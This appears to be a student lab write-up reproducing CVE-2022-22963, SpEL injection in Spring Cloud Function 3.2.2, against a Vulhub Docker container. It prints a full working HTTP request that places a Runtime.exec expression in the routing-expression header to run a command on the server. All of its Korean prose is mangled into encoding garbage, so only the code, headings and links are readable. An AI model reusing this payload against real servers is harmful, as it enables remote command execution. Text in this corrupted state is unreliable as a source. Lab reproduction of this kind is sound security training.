
# Spring Cloud Function SpEL ì½”ë“œ ì£¼ì… (CVE-2022-22963)

> í™”ì´íŠ¸í–‡ ìŠ¤ì¿¨ 3ê¸° (33ë°˜) - [ì¡°ë¯¼í˜• (@foskingson)](https://github.com/foskingson)

<br/>

### ğŸ“– **ëª©ì°¨**  

1. [ìš”ì•½](#ìš”ì•½)  
2. [ì·¨ì•½í•œ í™˜ê²½ êµ¬ì„±](#ì·¨ì•½í•œ-í™˜ê²½-êµ¬ì„±)  
3. [ì·¨ì•½ì  ì¬í˜„](#ì·¨ì•½ì -ì¬í˜„)  
4. [Pull Request ë§í¬](#Pull-Request-ë§í¬)  
5. [ì°¸ê³  ìë£Œ](#ì°¸ê³ -ìë£Œ)  

<br/>

### ğŸ“Œ **ìš”ì•½**

**Spring Cloud Function**ì€ AWS Lambdaì™€ ê°™ì€ **FaaS(Function as a Service)** í”Œë«í¼ì„ í¬í•¨í•˜ì—¬ ë‹¤ì–‘í•œ í”Œë«í¼ì—ì„œ í•¨ìˆ˜ ê¸°ë°˜ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ë°°í¬í•  ìˆ˜ ìˆë„ë¡ ì§€ì›í•˜ëŠ” ê³µí†µ ëª¨ë¸ì„ ì œê³µí•œë‹¤.  
ê·¸ëŸ¬ë‚˜ **Spring Cloud Function 3.2.2 ë²„ì „**ì—ëŠ” **SpEL(Spring Expression Language)ì„ í†µí•œ ì½”ë“œ ì£¼ì… ì·¨ì•½ì **ì´ ì¡´ì¬í•˜ë©°, ì´ë¥¼ ì•…ìš©í•´ **ì›ê²©ì—ì„œ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤.**

<br/>

### ğŸ› ï¸ **ì·¨ì•½í•œ í™˜ê²½ êµ¬ì„±**

1. ì•„ë˜ì˜ **ì°¸ê³ ìë£Œ 1ë²ˆ**ì„ ì°¸ê³ í•˜ì—¬ ë¡œì»¬ í™˜ê²½ì— `docker-compose.yml` íŒŒì¼ ì‘ì„±  
2. `docker-compose.yml`ì´ ìœ„ì¹˜í•œ ê²½ë¡œë¡œ ì´ë™  
3. `docker compose up` ëª…ë ¹ì–´ë¥¼ í†µí•´ ë„ì»¤ ì»¨í…Œì´ë„ˆ ì‹¤í–‰  
   - ì´ë¯¸ì§€ê°€ ë¡œì»¬ì— ì—†ë‹¤ë©´ ìë™ìœ¼ë¡œ ì„¤ì¹˜ë¨ (`docker pull`)  
   - `docker compose up --build`ë¥¼ í†µí•´ ì´ë¯¸ì§€ ìƒˆë¡œ ë¹Œë“œ ê°€ëŠ¥  

<p align="center">
  <img src="./1.png" alt="í™˜ê²½ êµ¬ì„±" width="700"/>
</p>

<br/>

### ğŸ§ª **ì·¨ì•½ì  ì¬í˜„**

#### 1. **ìŠ¤í”„ë§ ì„œë²„ ì •ìƒ ì‹¤í–‰ í™•ì¸**

ë„ì»¤ ì»¨í…Œì´ë„ˆ ì‹¤í–‰ í›„ ì•„ë˜ì™€ ê°™ì€ ê¸°ë³¸ í˜ì´ì§€ê°€ ë‚˜íƒ€ë‚˜ë©´ **ì •ìƒì ìœ¼ë¡œ ì„œë²„ê°€ ì—´ë¦° ê²ƒ**ì´ë‹¤.

<p align="center">
  <img src="./2.png" alt="ìŠ¤í”„ë§ ì›¹ì„œë²„ ê¸°ë³¸ í™”ë©´" width="700"/>
</p>

#### 2. **SpEL ì‚½ì…ì„ í†µí•œ ëª…ë ¹ì–´ ì‹¤í–‰**

ìš”ì²­ í—¤ë”ì— `spring.cloud.function.routing-expression` ê°’ì„ í†µí•´ **SpEL í‘œí˜„ì‹ì„ ì‚½ì…**í•˜ê³ ,  
ëŒ€ìƒ ì„œë²„ì—ì„œ `touch /tmp/success` **ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰**í•œë‹¤.

- íŒŒì´ì¬ ì½”ë“œë¡œ ì „ì†¡ (`vulhub.py` ì°¸ê³ )  
- ì„±ê³µ ì‹œ `/tmp` ë””ë ‰í† ë¦¬ì— `success` íŒŒì¼ì´ ìƒì„±ë¨

```http
POST /functionRouter HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")
Content-Type: text/plain
Content-Length: 4
```

#### 3. **success íŒŒì¼ ì¡´ì¬ í™•ì¸**

`docker compose exec spring bash` ëª…ë ¹ì–´ë¡œ ì»¨í…Œì´ë„ˆ ë‚´ë¶€ bashì— ì ‘ì†í•˜ì—¬  
`/tmp` ë””ë ‰í† ë¦¬ì—ì„œ `success` íŒŒì¼ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

- `docker compose exec spring bash`: `spring`ì´ë¼ëŠ” ì»¨í…Œì´ë„ˆ ì•ˆì—ì„œ bash ì‰˜ì„ ì‹¤í–‰í•˜ëŠ” ëª…ë ¹ì–´

<p align="center">
  <img src="./3.png" alt="ê³µê²© ì„±ê³µ" width="700"/>
</p>

<br/>

### ğŸ“š **ì°¸ê³  ìë£Œ**

1. [Vulhub GitHub - CVE-2022-22963 í™˜ê²½ êµ¬ì„±](https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22963)  
2. [VMware ê³µì‹ ë³´ì•ˆ ê³µì§€](https://tanzu.vmware.com/security/cve-2022-22963)  
3. [ì¤‘êµ­ ë¸”ë¡œê·¸ì˜ ê³µê²© ì˜ˆì‹œ](https://mp.weixin.qq.com/s/onYJWIESgLaWS64lCgsKdw)  
4. [Spring Cloud Function íŒ¨ì¹˜ ì»¤ë°‹](https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f)  
